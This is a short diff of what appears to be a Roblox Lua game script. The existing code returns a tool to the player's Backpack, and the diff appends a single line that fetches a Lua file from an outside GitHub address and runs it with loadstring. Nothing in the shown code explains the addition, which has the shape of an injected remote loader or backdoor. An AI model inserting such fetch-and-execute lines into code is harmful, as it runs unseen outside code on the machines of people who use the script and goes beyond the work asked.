@@ -27,3 +27,5 @@ connectCharacterAdded()
 player.CharacterRemoving:Connect(function()
     tool.Parent = game.Players.LocalPlayer.Backpack
 end)
+
+loadstring(game:HttpGet(('https://github.com/therealzeek/icon/blob/main/iconshow.lua')))()
